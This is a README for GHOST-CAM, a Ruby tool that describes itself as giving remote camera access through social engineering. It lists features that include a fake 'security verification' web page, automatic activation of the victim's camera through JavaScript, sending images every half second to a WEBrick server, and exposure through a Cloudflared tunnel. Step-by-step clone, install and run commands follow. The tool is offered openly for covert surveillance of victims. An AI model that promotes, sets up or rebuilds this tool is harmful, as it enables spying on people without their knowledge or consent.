<p align="center">
  <img 
    src="GHOST-CAM..jpg" 
    alt="GHOST-CAM" 
    width="600" 
  />
</p>


**GHOST-CAM** – A Ruby-based tool for remote camera access via social engineering.  

The main features of the tool are:  
- **Creates a fake HTML page** with an elegant interface simulating a *"security verification"* process.  
- **Automatically activates** the victim’s camera via `JavaScript`.  
- **Captures images repeatedly** and sends them to the server every 0.5 seconds.  
- **Runs a local server** using the `WEBrick` Ruby library to receive image uploads via `/upload`.  
- **Randomly selects a port** for operation.  
- **Publishes the server online** through `Cloudflared Tunnel` to receive captured images.

<table align="center">
  <tr>
    <td>
      <img src="GHOST-CAM_.jpg" width="400" alt="GHOST-CAM" />
    </td>
  </tr>
</table>

## Download
```bash
git clone https://github.com/AL-MARID/GHOST-CAM.git

```
Enter the tool directory

```bash
cd GHOST-CAM

```

Give execute permission to the 
install script
```bash
chmod +x install.sh

```
Run the install script

```bash
./install.sh

```
Give execute permission to the tool file

```bash
chmod +x bin/GHOST-CAM.rb

```
Run the tool directly (make sure it has execute permission)

```bash
./bin/GHOST-CAM.rb

```

Run the tool using Ruby interpreter (no execute permission needed)

```bash
ruby bin/GHOST-CAM.rb

```
